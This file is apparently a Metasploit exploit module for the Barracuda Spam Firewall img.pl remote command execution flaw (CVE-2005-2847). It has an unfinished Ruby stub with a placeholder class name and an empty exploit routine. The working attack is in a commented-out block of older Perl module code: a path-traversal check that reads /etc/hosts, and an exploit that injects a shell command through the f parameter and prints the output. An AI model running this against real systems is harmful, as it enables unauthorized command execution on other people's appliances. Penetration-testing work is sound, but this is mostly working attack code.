require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Barracuda IMG.PL Remote Command Execution',
			'Description'    => %q{
				This module exploits an arbitrary command execution
				vulnerability in the Barracuda Spam Firewall appliance.
				Versions prior to  3.1.18 are vulnerable.
					
			},
			'Author'         => [ 'Nicolas Gregoire <ngregoire@exaprobe.com>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1'],
					[ 'CVE', '2005-2847'],
					[ 'OSVDB', '19279'],
					[ 'BID', '14712'],
					[ 'NSS', '19556'],
					[ 'MIL', '99'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'linux',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Sep 01 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::barracuda_img_exec;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'Barracuda IMG.PL Remote Command Execution',
	'Version'  => '$Revision$',
	'Authors'  => [ 'Nicolas Gregoire <ngregoire@exaprobe.com>' ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'linux' ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 8000],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'IMG'   => [1, 'DATA', 'Full path of img.pl script', '/cgi-bin/img.pl'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(qq{
		This module exploits an arbitrary command execution vulnerability in the
		Barracuda Spam Firewall appliance. Versions prior to  3.1.18 are vulnerable.
}),

	'Refs' =>
	  [
		['URL', 'http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1'],
		['CVE', '2005-2847'],
		['OSVDB', '19279'],
		['BID', '14712'],
		['NSS', '19556'],
		['MIL', '99'],
	  ],

	'Payload' =>
	  {
		'Space' => 512,
		'Keys'  => ['cmd'],
	  },

	'Keys' => ['barracuda'],

	'DisclosureDate' => 'Sep 01 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host    = $self->GetVar('RHOST');
	my $vhost          = $self->VHost;
	my $target_port    = $self->GetVar('RPORT');
	my $img            = $self->GetVar('IMG');

	my $request =
	  "GET $img?f=%2e%2e/etc/hosts HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$self->PrintLine("[*] Establishing a connection to the target...");

	$s->Send($request);
	my $results = $s->Recv(-1, 20);
	$s->Close();
	
	if (($results =~ /HTTP\/1\..\s+200/) && ($results =~/127\.0\.0\.1/)) {

		$self->PrintLine("[*] Vulnerable server detected!");
		return $self->CheckCode('Confirmed');
		
	} elsif ($results =~ /HTTP\/1\..\s+([345]\d+)/) {

		$self->PrintLine("[*] The Barraccuda application was not found.");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] Generic error...");
	return $self->CheckCode('Generic');
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar('RHOST');
	my $vhost          = $self->VHost;
	my $target_port    = $self->GetVar('RPORT');
	my $img            = $self->GetVar('IMG');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $cmd            = $encodedPayload->RawPayload;

	$img = $img."?f=".$self->URLEncode(qq#../bin/sh -c "echo 'YYY';#. $cmd .qq#;echo 'YYY'"|#);

	my $request =
	  "GET $img HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the target...");
	$s->Send($request);
	my $results = $s->Recv(-1, 20);
	
	if ($results =~ /HTTP\/1\.. 200 OK/im) {

		(undef, $results) = split(/YYY/, $results);
		
		$self->PrintLine(' ');
		$self->PrintLine("$results");
		$self->PrintLine(' ');

		$self->PrintLine("[*] End of data.");

	} else {
		$self->PrintLine(' ');
		$self->PrintLine("Doh ! Are you sure this server is vulnerable ?");
	}

	$s->Close();
	return;
}

sub URLEncode {
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack('C*', $data)) {
		if (
			($c >= 0x30 && $c <= 0x39) ||
			($c >= 0x41 && $c <= 0x5A) ||
			($c >= 0x61 && $c <= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf("%%%.2x", $c);
		}
	}
	return $res;
}

sub VHost {
	my $self = shift;
	my $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');
	return $name;
}

1;

=end


end
end	
